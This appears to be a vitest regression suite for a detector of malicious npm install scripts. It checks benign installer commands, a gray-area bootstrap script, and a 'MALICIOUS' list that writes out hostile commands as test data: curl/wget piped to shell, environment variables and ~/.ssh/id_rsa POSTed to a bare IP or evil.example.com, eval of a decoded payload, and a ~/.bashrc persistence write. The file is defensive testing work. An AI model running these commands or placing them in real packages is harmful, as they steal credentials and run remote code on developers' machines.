/**
 * 语料回归：良性安装器形态必须不被拦（设计目标 pass），公开投毒手法必须 BLOCK，灰色地带必须 warn。
 * 良性语料取自真实安装器链路（node-gyp / prebuild / husky / esbuild 式下载器）；
 * 恶意语料取自 npm 投毒事件的公开手法（curl|sh、环境变量 POST 外传、eval 载荷、裸 IP、敏感路径、持久化）。
 * 本文件是 README「语料回归跑分」表的数字来源——改检测逻辑先过这里。
 */
import { describe, expect, it } from 'vitest'
import { analyzeInstallScript } from '../src/script-analysis.ts'

interface Sample {
  cmd: string
  files?: Record<string, string>
  note: string
}

const BENIGN: Sample[] = [
  { cmd: 'node-gyp rebuild', note: 'native 编译（node-gyp）' },
  { cmd: 'prebuild-install || node-gyp rebuild --verbose', note: '预编译回退链路' },
  { cmd: 'husky install', note: 'husky hooks' },
  { cmd: 'simple-git-hooks', note: 'simple-git-hooks' },
  {
    cmd: 'node install.js',
    files: { 'install.js': 'require("prebuild-install").run()' },
    note: 'sharp 式预编译下载器',
  },
  {
    cmd: 'node esbuild-postinstall.js',
    files: { 'esbuild-postinstall.js': 'const arch = process.env.ARCH; fetch("https://nodejs.org/dist/" + arch)' },
    note: 'esbuild 式：读 env 判架构 + 官方域名下载',
  },
  {
    cmd: 'node ./scripts/check-arch.js',
    files: { 'scripts/check-arch.js': 'console.log(process.arch)' },
    note: '本地脚本：读架构打印',
  },
  { cmd: 'mkdir -p lib && cp src/a.js lib/a.js', note: '纯本地文件操作' },
]

const MALICIOUS: Sample[] = [
  { cmd: 'curl -s http://10.0.0.1/i | sh', note: 'curl|sh 直连裸 IP' },
  { cmd: 'wget -qO- https://evil.cd/x.sh | bash', note: 'wget|bash 下载执行' },
  { cmd: 'printenv | curl -X POST http://10.0.0.1/exfil', note: '环境变量管道外传' },
  { cmd: 'powershell -enc SQBFAFgA', note: 'PowerShell base64 编码命令' },
  {
    cmd: 'node run.js',
    files: { 'run.js': 'eval(atob("QUJD"))' },
    note: '引用文件内 eval 解码载荷',
  },
  {
    cmd: 'node post.js',
    files: {
      'post.js': 'fetch("http://evil.example.com", { method: "POST", body: process.env.TOKEN })',
    },
    note: '环境变量经 POST 外传',
  },
  { cmd: 'echo x >> ~/.bashrc', note: '写入 shell 持久化位置' },
  {
    cmd: 'node s.js',
    files: { 's.js': 'const h = process.env.H; fetch("/z")' },
    note: 'env+网络但无任何可识别域名（混淆）',
  },
  {
    cmd: 'cat ~/.ssh/id_rsa | curl -X POST http://10.0.0.1',
    note: '敏感凭据读指向裸 IP',
  },
]

const GRAY: Sample[] = [
  {
    cmd: 'node bootstrap.js',
    files: {
      'bootstrap.js': 'require("child_process").execSync("tar xzf b.tar.gz"); fetch("http://mirror.unknown-cd.example/b")',
    },
    note: '子进程+解压+陌生镜像域名（真实世界确实存在，交人工确认）',
  },
]

describe('语料回归：良性安装器（设计目标 pass，红线是不误报 block）', () => {
  it.each(BENIGN)('$note → 非 block', ({ cmd, files }) => {
    expect(analyzeInstallScript(cmd, files).verdict).not.toBe('block')
  })
  it('跑分：0 误报（无一条 benign 被拦）', () => {
    const verdicts = BENIGN.map((b) => analyzeInstallScript(b.cmd, b.files).verdict)
    expect(verdicts.filter((v) => v === 'block')).toHaveLength(0)
  })
})

describe('语料回归：公开投毒手法（必须全数 BLOCK）', () => {
  it.each(MALICIOUS)('$note → BLOCK', ({ cmd, files }) => {
    expect(analyzeInstallScript(cmd, files).verdict).toBe('block')
  })
  it('跑分：0 漏报', () => {
    expect(MALICIOUS.every((m) => analyzeInstallScript(m.cmd, m.files).verdict === 'block')).toBe(true)
  })
})

describe('语料回归：灰色地带（必须 warn 转人工，不误杀也不放行）', () => {
  it('gray → warn', () => {
    for (const g of GRAY) {
      const a = analyzeInstallScript(g.cmd, g.files)
      expect(a.verdict).toBe('warn')
    }
  })
})
